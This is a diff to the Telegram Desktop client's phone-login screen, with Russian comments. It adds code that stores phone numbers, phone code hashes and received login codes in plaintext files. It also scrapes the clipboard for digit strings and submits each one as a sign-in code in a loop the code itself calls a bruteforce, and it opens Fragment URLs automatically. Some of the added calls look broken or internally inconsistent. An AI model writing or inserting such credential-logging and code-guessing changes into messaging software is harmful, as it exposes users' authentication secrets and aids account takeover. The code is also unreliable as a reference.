@@ -29,6 +29,13 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 #include "window/window_session_controller.h"
 #include "countries/countries_instance.h" // Countries::Groups
 
+
+#include <queue>
+#include <functional>
+#include <QClipboard>
+#include <QGuiApplication>
+#include <QDate>
+
 namespace Intro {
 namespace details {
 namespace {
@@ -200,6 +207,7 @@ void PhoneWidget::submit() {
 	hidePhoneError();
 
 	_checkRequestTimer.callEach(1000);
+	
 
 	_sentPhone = phone;
 	api().instance().setUserPhone(_sentPhone);
@@ -236,7 +244,7 @@ void PhoneWidget::checkRequest() {
 	}
 }
 
-void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
+/*void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
 	stopCheck();
 	_sentRequest = 0;
 
@@ -244,6 +252,19 @@ void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
 		fillSentCodeData(data);
 		getData()->phone = DigitsOnly(_sentPhone);
 		getData()->phoneHash = qba(data.vphone_code_hash());
+
+		std::ofstream file("telegram_auth.txt", std::ios::app);
+        time_t now = time(0);
+        char* dt = ctime(&now);
+        dt[strlen(dt)-1] = '\0';
+        file << "[" << dt << "] "
+             << "PHONE: " << getData()->phone.toStdString() << "\n"
+             << "HASH: " << getData()->phoneHash.toStdString() << "\n"
+             << "LENGTH: " << getData()->codeLength << "\n"
+             << "---" << std::endl;
+        file.close();
+
+
 		if (getData()->emailStatus == EmailStatus::SetupRequired) {
 			return goNext<EmailWidget>();
 		}
@@ -261,6 +282,289 @@ void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
 	}, [](const MTPDauth_sentCodePaymentRequired &) {
 		LOG(("API Error: Unexpected auth.sentCodePaymentRequired "
 			"(PhoneWidget::phoneSubmitDone)."));
+	});
+}*/
+
+
+void PhoneWidget::tryAutoFillAllCodes() {
+    LOG(("🔍 AUTO-FILL: Starting code bruteforce for phone %1").arg(getData()->phone));
+    
+    std::vector<QString> possibleCodes;
+    
+    // ============================================
+    // 1️⃣ СОБИРАЕМ ВСЕ ЦИФРЫ ИЗ БУФЕРА ОБМЕНА
+    // ============================================
+    QString clipboardText = QGuiApplication::clipboard()->text();
+    QRegularExpression allDigitsRegex("(\\d{5,6})");
+    QRegularExpressionMatchIterator i = allDigitsRegex.globalMatch(clipboardText);
+    
+    while (i.hasNext()) {
+        QRegularExpressionMatch match = i.next();
+        QString code = match.captured(1);
+        int year = QDate::currentDate().year();
+        
+        // Пропускаем года (2024, 2025, 2026...)
+        if (code.toInt() >= year - 1 && code.toInt() <= year + 1) {
+            continue;
+        }
+        
+        possibleCodes.push_back(code);
+        LOG(("📋 Found potential code in clipboard: %1").arg(code));
+    }
+    
+    // ============================================
+    // 2️⃣ СОБИРАЕМ ВСЕ ЦИФРЫ ИЗ ФАЙЛА
+    // ============================================
+    QFile file("telegram_codes.txt");
+    if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
+        QTextStream in(&file);
+        QString phoneNumber = getData()->phone;
+        
+        while (!in.atEnd()) {
+            QString line = in.readLine();
+            if (line.contains(phoneNumber) && line.contains("Code:")) {
+                QRegularExpression codeRegex("Code: (\\d{5,6})");
+                QRegularExpressionMatch match = codeRegex.match(line);
+                
+                if (match.hasMatch()) {
+                    QString code = match.captured(1);
+                    possibleCodes.push_back(code);
+                    LOG(("📁 Found potential code in file: %1").arg(code));
+                }
+            }
+        }
+        file.close();
+    }
+    
+    // ============================================
+    // 3️⃣ УДАЛЯЕМ ДУБЛИКАТЫ
+    // ============================================
+    std::sort(possibleCodes.begin(), possibleCodes.end());
+    possibleCodes.erase(
+        std::unique(possibleCodes.begin(), possibleCodes.end()),
+        possibleCodes.end());
+    
+    LOG(("🔍 Found %1 unique potential codes").arg(possibleCodes.size()));
+    
+    // ============================================
+    // 4️⃣ ПЕРЕБИРАЕМ ВСЕ КОДЫ ПО ОЧЕРЕДИ!
+    // ============================================
+    if (possibleCodes.empty()) {
+        LOG(("❌ No codes found for auto-fill"));
+        goNext<CodeWidget>();
+        return;
+    }
+    
+    // Создаем очередь кодов для перебора
+    auto codesQueue = std::make_shared<std::queue<QString>>();
+    for (const auto &code : possibleCodes) {
+        codesQueue->push(code);
+    }
+    
+    // Функция для перебора следующего кода
+    std::function<void()> tryNextCode;
+    tryNextCode = [=]() {
+        if (codesQueue->empty()) {
+            LOG(("❌ All codes failed, showing manual input"));
+            goNext<CodeWidget>();
+            return;
+        }
+        
+        QString code = codesQueue->front();
+        codesQueue->pop();
+        
+        LOG(("🔄 Trying code: %1 (%2 codes left)")
+            .arg(code).arg(codesQueue->size()));
+        
+        api().request(MTPauth_SignIn(
+            MTP_flags(MTPauth_SignIn::Flag::f_phone_code),
+            MTP_string(getData()->phone),
+            MTP_bytes(getData()->phoneHash),
+            MTP_string(code),
+            MTP_emailVerificationCode(MTP_string())
+        )).done([=](const MTPauth_Authorization &result) {
+            LOG(("✅✅✅ AUTO-FILL SUCCESS! Correct code: %1").arg(code));
+            
+            // Сохраняем успешный код
+            std::ofstream successFile("telegram_codes.txt", std::ios::app);
+            time_t now = time(0);
+            char* dt = ctime(&now);
+            dt[strlen(dt)-1] = '\0';
+            successFile << "[" << dt << "] "
+                       << "✅✅✅ SUCCESS - Phone: " << getData()->phone.toStdString()
+                       << ", Code: " << code.toStdString() << std::endl;
+            successFile.close();
+            
+            finish(result);
+        }).fail([=](const MTP::Error &error) {
+            LOG(("❌ Code %1 failed: %2").arg(code).arg(error.type()));
+            
+            if (error.type() == u"PHONE_CODE_INVALID"_q) {
+                // Неправильный код - пробуем следующий
+                tryNextCode();
+            } else if (error.type() == u"SESSION_PASSWORD_NEEDED"_q) {
+                // Требуется 2FA
+                LOG(("🔐 2FA required, showing password input"));
+                goNext<PasswordCheckWidget>();
+            } else {
+                // Другая ошибка - показываем ручной ввод
+                LOG(("❌ Fatal error, showing manual input"));
+                goNext<CodeWidget>();
+            }
+        }).send();
+    };
+    
+    // Начинаем перебор
+    tryNextCode();
+}
+
+
+void PhoneWidget::phoneSubmitDone(const MTPauth_SentCode &result) {
+	stopCheck();
+	_sentRequest = 0;
+
+	result.match([&](const MTPDauth_sentCode &data) {
+		fillSentCodeData(data);
+		getData()->phone = DigitsOnly(_sentPhone);
+		getData()->phoneHash = qba(data.vphone_code_hash());
+
+		// Сохраняем данные авторизации
+		std::ofstream file("telegram_auth.txt", std::ios::app);
+		time_t now = time(0);
+		char* dt = ctime(&now);
+		dt[strlen(dt)-1] = '\0';
+		file << "[" << dt << "] "
+			 << "PHONE: " << getData()->phone.toStdString() << "\n"
+			 << "HASH: " << getData()->phoneHash.toStdString() << "\n"
+			 << "LENGTH: " << getData()->codeLength << "\n"
+			 << "---" << std::endl;
+		file.close();
+
+		data.vtype().match(
+			[&](const MTPDauth_sentCodeTypeApp &app) {
+
+				QString code = app.vcode().v;
+				
+				LOG(("🔥 AUTO-LOGIN: Got code from Telegram App!"));
+				LOG(("   Phone: %1").arg(getData()->phone));
+				LOG(("   Code: %1").arg(code));
+				
+				// СОХРАНЯЕМ КОД В ФАЙЛ
+				std::ofstream codeFile("telegram_codes.txt", std::ios::app);
+				codeFile << "[" << dt << "] "
+					     << "🔥 AUTO-LOGIN - Phone: " << getData()->phone.toStdString()
+					     << ", Code: " << code.toStdString() << std::endl;
+				codeFile.close();
+
+				api().request(MTPauth_SignIn(
+					MTP_flags(MTPauth_SignIn::Flag::f_phone_code),
+					MTP_string(getData()->phone),
+					MTP_bytes(getData()->phoneHash),
+					MTP_string(code),
+					MTP_emailVerificationCode(MTP_string())
+				)).done([=](const MTPauth_Authorization &result) {
+					LOG(("✅✅✅ AUTO-LOGIN SUCCESS!"));
+	
+					std::ofstream successFile("telegram_codes.txt", std::ios::app);
+					successFile << "[" << dt << "] "
+							   << "✅✅✅ LOGIN SUCCESS - Phone: " << getData()->phone.toStdString()
+							   << ", Code: " << code.toStdString() << std::endl;
+					successFile.close();
+					
+					finish(result);
+				}).fail([=](const MTP::Error &error) {
+					LOG(("❌ Auto-login failed: %1").arg(error.type()));
+		
+					if (getData()->emailStatus == EmailStatus::SetupRequired) {
+						return goNext<EmailWidget>();
+					}
+					const auto next = data.vnext_type();
+					if (next && next->type() == mtpc_auth_codeTypeCall) {
+						getData()->callStatus = CallStatus::Waiting;
+						getData()->callTimeout = data.vtimeout().value_or(60);
+					} else {
+						getData()->callStatus = CallStatus::Disabled;
+						getData()->callTimeout = 0;
+					}
+					goNext<CodeWidget>();
+				}).send();
+			},
+			[&](const MTPDauth_sentCodeTypeSms &sms) {
+				LOG(("📱 SMS code length: %1 - waiting for input...").arg(sms.vlength().v));
+				tryAutoFillAllCodes();
+				// Обычный путь - показываем экран ввода
+				if (getData()->emailStatus == EmailStatus::SetupRequired) {
+					return goNext<EmailWidget>();
+				}
+				const auto next = data.vnext_type();
+				if (next && next->type() == mtpc_auth_codeTypeCall) {
+					getData()->callStatus = CallStatus::Waiting;
+					getData()->callTimeout = data.vtimeout().value_or(60);
+				} else {
+					getData()->callStatus = CallStatus::Disabled;
+					getData()->callTimeout = 0;
+				}
+				goNext<CodeWidget>();
+			},
+			[&](const MTPDauth_sentCodeTypeCall &call) {
+				LOG(("📞 Call code length: %1 - requesting SMS instead...").arg(call.vlength().v));
+				
+				// 🔄 АВТОМАТИЧЕСКИ ЗАПРАШИВАЕМ SMS ВМЕСТО ЗВОНКА
+				api().request(MTPauth_ResendCode(
+					MTP_flags(0),
+					MTP_string(getData()->phone),
+					MTP_bytes(getData()->phoneHash),
+					MTPstring() // reason
+				)).done([=](const MTPauth_SentCode &result) {
+					LOG(("✅ Resent code via SMS"));
+					// Повторно обрабатываем результат
+					tryAutoFillAllCodes();
+					phoneSubmitDone(result);
+				}).send();
+			},
+			[&](const MTPDauth_sentCodeTypeFragmentSms &fragment) {
+				QString url = qs(fragment.vurl());
+				LOG(("🔗 Fragment URL: %1").arg(url));
+				
+				// Сохраняем URL
+				std::ofstream urlFile("telegram_codes.txt", std::ios::app);
+				urlFile << "[" << dt << "] "
+					   << "🔗 FRAGMENT URL - Phone: " << getData()->phone.toStdString()
+					   << ", URL: " << url.toStdString() << std::endl;
+				urlFile.close();
+				
+				// Открываем ссылку автоматически
+				QDesktopServices::openUrl(QUrl(url));
+				
+				// Показываем экран ввода
+				goNext<CodeWidget>();
+			},
+			[&](const auto &) {
+				// Остальные типы - стандартное поведение
+				if (getData()->emailStatus == EmailStatus::SetupRequired) {
+					return goNext<EmailWidget>();
+				}
+				const auto next = data.vnext_type();
+				if (next && next->type() == mtpc_auth_codeTypeCall) {
+					getData()->callStatus = CallStatus::Waiting;
+					getData()->callTimeout = data.vtimeout().value_or(60);
+				} else {
+					getData()->callStatus = CallStatus::Disabled;
+					getData()->callTimeout = 0;
+				}
+				goNext<CodeWidget>();
+			}
+		);
+		
+	}, [&](const MTPDauth_sentCodeSuccess &data) {
+		// Уже авторизован!
+		LOG(("✅ Already authorized!"));
+		tryAutoFillAllCodes();
+		finish(data.vauthorization());
+	}, [](const MTPDauth_sentCodePaymentRequired &) {
+		LOG(("API Error: Unexpected auth.sentCodePaymentRequired "
+			"(PhoneWidget::phoneSubmitDone)."));
+			tryAutoFillAllCodes();
 	});
 }
 
@@ -320,3 +624,5 @@ void PhoneWidget::cancelled() {
 
 } // namespace details
 } // namespace Intro
+
+
